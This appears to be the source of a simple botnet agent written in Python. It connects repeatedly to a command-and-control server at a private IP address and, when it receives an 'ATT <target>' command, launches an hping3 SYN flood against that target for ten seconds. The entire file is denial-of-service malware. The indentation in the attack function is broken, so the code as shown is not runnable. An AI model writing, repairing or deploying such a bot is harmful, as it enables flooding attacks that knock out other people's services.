import socket, time, os
import urllib.request
import subprocess


CNC_IP = "10.10.10.100"
CNC_PORT = 5002

def connect_to_cnc():
    while True:
        try:    
            s = socket.socket()
            s.connect((CNC_IP, CNC_PORT))
            return s
        except:
            time.sleep(5)

def listen(sock):
    while True:
        try:
            data = sock.recv(1024).decode().strip()

            if data.startswith("ATT"):
                parts = data.split()
                if len(parts) > 1:
                    target = parts[1]
                    attack(target)
                    
        except Exception as e:
            print("Errore:", e)
        
def attack(target):
    # hping 3 -S --flood --rand-source -p 80 {target}

   
        hping_cmd = [
            "sudo", "hping3",
            "-S",
            "-p", "80",    
            "--flood",
            target
        ]
             
    
    print(f"Running: {' '.join(hping_cmd)}")
    # Start the process
    process = subprocess.Popen(hping_cmd)
    
    # Run for 10 seconds
    time.sleep(10)
    
    # Stop the process
    process.terminate()
        process.wait()
    print("Hping3 stopped.")

while True:
    sock = connect_to_cnc()
    listen(sock)

